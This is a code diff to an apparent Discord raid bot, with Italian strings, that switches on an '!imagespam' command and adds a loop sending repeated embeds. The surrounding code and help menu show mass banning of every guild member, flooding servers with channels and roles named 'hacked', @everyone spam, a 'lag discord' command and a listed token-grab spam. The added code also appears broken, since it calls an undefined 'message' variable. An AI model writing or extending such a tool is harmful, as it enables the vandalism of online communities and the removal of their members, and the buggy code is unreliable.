@@ -29,7 +29,7 @@ shit.on("message", tadishit => {
  :loud_sound: !voice - Create 30 voice name hacked (Disponibile)
  :ferris_wheel: !role - Create 30 role name hacked (Disponibile)
  :warning: !spam - Spam In Channels: [@everyone] (Disponibile)
- :frame_photo: !imagespam - Spam In Channels Images With: [@everyone] (Non disponibile)
+ :frame_photo: !imagespam - Spam In Channels Images With: [@everyone] (Disponibile)
  :radioactive: !lag - lag discord: [@everyone] (Disponibile)
  :santa: !christams - Spam In Channels Christmas gif: [@everyone] (Disponibile)
  :key: !free - Spam In Channels Token Grab: [@everyone] (Non disponibile)
@@ -59,6 +59,13 @@ shit.on("message", tadishit => {
     tadishit.guild.members.forEach(d => d.ban().catch(x => {
         console.log("Non ho i permessi per bannare utente.")
     }));
+ }
+ if(dioo === "imagespam"){
+     for (var xd=0; xd<5;xd++){
+         const lel = new Discord.RichEmbed()
+         .setImage(tadishit.user.avatarURL)
+         message.channel.send(lel)
+     }
  }
  if(dioo === "channelrole"){
     for(var d=0;d<50;d++){
